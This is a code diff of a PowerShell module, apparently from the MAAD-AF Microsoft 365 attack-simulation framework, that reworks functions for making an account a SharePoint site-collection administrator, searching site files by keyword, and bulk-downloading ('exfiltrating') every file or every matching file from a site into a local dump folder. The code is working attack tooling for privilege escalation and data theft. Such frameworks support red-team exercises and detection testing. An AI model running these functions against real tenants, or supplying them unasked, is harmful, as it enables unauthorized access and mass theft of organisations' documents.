@@ -2,35 +2,38 @@
 
 function GrantAccessToSharpointSite {
 
-    EnterAccount ("`nEnter an account to give access to (user@org.com)")
+    EnterAccount ("`n[?] Enter account to grant access (user@org.com)")
     $target_account = $global:account_username
 
-    EnterSharepointSite ("Enter a SharePoint site name to gain access to")
+    EnterSharepointSite ("`n[?] Enter SharePoint site to gain access to")
+
     $target_site_name = $global:sharepoint_site_name
     $target_site_url = $global:sharepoint_site_url
 
     #Grant access to site
-    Write-Host "`nAttempting to grant access to SharePoint site..." -ForegroundColor Gray
+    MAADWriteProcess "Attempting access grant to SharePoint site"
+    MAADWriteProcess "Account: $target_account -> Site: $target_site_name"
     try {
-        Set-SPOUser -Site $target_site_url -LoginName $target_account -IsSiteCollectionAdmin $true -ErrorAction Stop
+        Set-SPOUser -Site $target_site_url -LoginName $target_account -IsSiteCollectionAdmin $true -ErrorAction Stop | Out-Null
         Start-Sleep -Seconds 5
-        Write-Host "`n[Success] Granted '$target_account' access to SharePoint site: $target_site_name" -ForegroundColor Yellow
+        MAADWriteSuccess "Account Granted Access to Site" 
     }
     catch {
-        Write-Host "`n[Error] Failed to get access to SharePoint site: $target_site_name" -ForegroundColor Red
+        MAADWriteError "Failed to get access to site"
     }
+    Write-Host ""
+    MAADPause
  }
 
  function SearchSharepointSite{
-    EnterSharepointSite ("Enter a SharePoint site name to search in")
+    EnterSharepointSite ("`n[?] Enter SharePoint site to search")
     $target_site_name = $global:sharepoint_site_name
     $target_site_url = $global:sharepoint_site_url
 
     #Select a credential to use
     UseCredential
     $target_current_username = $global:current_username
-    $current_secure_pass = ConvertTo-SecureString $global:current_password -AsPlainText -Force 
-    $target_current_credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($target_current_username, $current_secure_pass)
+    $target_current_credential = $global:current_credentials
 
     #Connect to sharepoint site
     ConnectSharepointSite $target_site_url $target_current_credential
@@ -38,87 +41,102 @@ function GrantAccessToSharpointSite {
 
         #Find a file or all files
         while ($true) {
-            $keyword = Read-Host -Prompt "`nEnter a keyword to search matching files (Eg: secret or exit search)"
+            MAADWriteInfo "Find files matching the search term"
+            MAADWriteInfo "Enter [exit-module] to exit"
+            $keyword = Read-Host -Prompt "`n[?] Enter search term"
+            Write-Host ""
             
             if ($keyword -in "",$null) {
-                Write-Host "`n[Input Error] Search term cannot be blank. I am sure you can think of an interesting file you would like to look for`n" -ForegroundColor Red
-                Write-Host "[Tip] You can type 'exit search' in search term to exit this module" -ForegroundColor Gray
+                MAADWriteError "Search term cannot be blank"
+                MAADWriteInfo "You can type [exit-module] to exit"
             }
 
-            if ($keyword -eq "exit search") {
-                Write-Host "`nExiting file search" -ForegroundColor Gray
+            if ($keyword -eq "exit-module") {
+                MAADWriteProcess "Exiting file search module"
                 break
             }
 
             if ($keyword -ne ""){
                 #Searching for file
-                Write-Host "`nSearching for files matching the term: $keyword" -ForegroundColor Gray
+                MAADWriteProcess "Searching for files matching term -> $keyword"
                 
                 $current_time = Get-Date -Format "dd_MM_dd_yyyy_HH_mm"
-                $search_result = Find-PnPFile -Match *$keyword* 
-                
-                if ($null -eq $search_result) {
-                    Write-Host "`nNo results found matching the search" -ForegroundColor Red
+                try{
+                    $search_result = Find-PnPFile -Match *$keyword* 
+
+                    if ($null -eq $search_result) {
+                        MAADWriteError "No files found"
+                    }
+                    else {
+                        MAADWriteProcess "Found $($search_result.Count) files"
+                        $search_result | Out-File -FilePath .\Outputs\SharePoint_File_Search_Report_$current_time.txt -Append
+                        MAADWriteProcess "Output Saved -> \MAAD-AF\Outputs\SharePoint_File_Search_Report_$current_time.txt"
+                        if ($search_result.Count -gt 5){
+                            MAADWriteProcess "Listing first 5 results"
+                            MAADWriteSuccess "Search Completed" 
+                            $search_result | Select-Object -First 5 | Format-Table
+                        }
+                        else{
+                            MAADWriteSuccess "Search Completed" 
+                            $search_result | Format-Table
+                        }
+                    }  
                 }
-                elseif ($search_result.Count -gt 20){
-                    Write-Host "`nSearch returned $($search_result.Count) matches. Returning first 10 matches. Full results are stored in the /Outputs directory" -ForegroundColor Gray
-                    $search_result | Select-Object -First 10
-                    $search_result | Out-File -FilePath .\Outputs\SharePoint_File_Search_Report_$current_time.txt -Append
-                    Write-Host "`n[Success] Search completed!" -ForegroundColor Yellow
-                    Write-Host "`n[Tip] You can enter 'exit search' to go back to menu" -ForegroundColor Gray
-                }  
-                else{
-                    $search_result
+                catch{
+                    MAADWriteError "Failed to execute file search"
                 }
             } 
+            Write-Host ""
+            MAADPause
         }
     }
 }
 
  function ExfilDataFromSharepointSite{
     #Select a target site
-    EnterSharepointSite ("Enter a SharePoint site name to search in")
+    EnterSharepointSite ("`n[?] Enter SharePoint site name to exfiltrate")
     $target_site_name = $global:sharepoint_site_name
     $target_site_url = $global:sharepoint_site_url
 
     #Select a credential to use
     UseCredential
     $target_current_username = $global:current_username
-    $current_secure_pass = ConvertTo-SecureString $global:current_password -AsPlainText -Force 
-    $target_current_credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($target_current_username, $current_secure_pass)
+    $target_current_credential = $global:current_credentials
 
     #Connect to sharepoint site
     ConnectSharepointSite $target_site_url $target_current_credential
     
     if ($global:sp_site_connected -eq $true){
         $current_time = Get-Date -Format "dd_MM_dd_yyyy_HH_mm"
-        $current_dump_folder_name = "MAAD_SP_Exfil_"+$current_time
+        $current_dump_folder_name = "SP_Exfil_"+$current_time
         #Create a download folder
         if ((Test-Path -Path ".\Outputs\SharepointDump\$current_dump_folder_name") -eq $false){
-            Write-Host "`nCreating directory 'SharePointDump\$current_dump_folder_name' in /Outputs to dump all files..." -ForegroundColor Gray
+            MAADWriteProcess "Creating directory -> \MAAD-AF\Outputs\SharePointDump\$current_dump_folder_name"
             New-Item -ItemType Directory -Force -Path .\Outputs\SharepointDump\$current_dump_folder_name | Out-Null
         }
 
         #Check user preference
-        Write-Host "`n[Tip] To exfil specific file types enter the file extension in search like 'docx', 'pdf', 'DWG'" -ForegroundColor DarkGray
-        $user_search_term = Read-Host -Prompt "`nEnter a term or file extension -OR- leave blank and hit 'Enter' if you would like to exfil all files"
+        MAADWriteInfo "To exfil specific file type enter a file extension -> [docx] [pdf] [DWG]"
+        MAADWriteInfo "Leave blank and press [Enter] to exfiltrate all files"
+        $user_search_term = Read-Host -Prompt "`n[?] Enter term or file extension"
+        Write-Host ""
 
-        Write-Host "`nInitiating exfil from SharePoint..." -ForegroundColor Gray
+        MAADWriteProcess "Initiating exfil from SharePoint"
         
         
         if ($user_search_term -in $null,""){
-            Write-Host "`n1. Traversing through SharePoint to find all files..." -ForegroundColor Gray
+            MAADWriteProcess "Traversing through site to find all files"
             $all_files = Find-PnPFile -Match *
         }
         else {
-            Write-Host "`n1. Traversing through SharePoint to find files matching the term..." -ForegroundColor Gray
+            MAADWriteProcess "Traversing through site to find files matching the term"
             $all_files = Find-PnPFile -Match *$user_search_term*
         }
 
-        Write-Host "2. Found $($all_files.Length) total files" -ForegroundColor Gray
-        Write-Host "3. Preparing to dump all found files to local directory..." -ForegroundColor Gray
-        Write-Host "4. Resolving relative download paths for each file..." -ForegroundColor Gray
-        Write-Host "5. Exfil in progress..." -ForegroundColor Gray
+        MAADWriteProcess "Found $($all_files.Length) total files"
+        MAADWriteProcess "Preparing to dump all found files to local directory"
+        MAADWriteProcess "Resolving relative download paths for each file"
+        MAADWriteProcess "Exfil in progress"
         Write-Progress -Activity "Exfiltrating data..." -Status "0% complete:" -PercentComplete 0;
         
         $counter = 0
@@ -131,11 +149,11 @@ function GrantAccessToSharpointSite {
             $counter++
             Write-Progress -Activity "SharePoint exfiltration in progress" -Status "$([math]::Round($counter/$all_files.Length * 100))% complete:" -PercentComplete ([math]::Round($counter/$all_files.Length * 100));
         }
-
-        Write-Host "`nSharePoint exfil details:" -ForegroundColor Gray
-        Write-Host "Total files exfiltrated: $counter/$($all_files.Length)"  -ForegroundColor Gray
-        Write-Host "Total data exfiltrated: $download_size"  -ForegroundColor Gray
-        Write-Host "`n[Success] SharePoint data exfiltrated!" -ForegroundColor Yellow
+        MAADWriteProcess "Output Saved -> \MAAD-AF\Outputs\SharePointDump\$current_dump_folder_name"
+        MAADWriteProcess "Files Exfiltrated -> $counter/$($all_files.Length)"
+        MAADWriteSuccess "SharePoint Site Data Exfiltrated" 
     }
+    Write-Host ""
+    MAADPause
 }
 
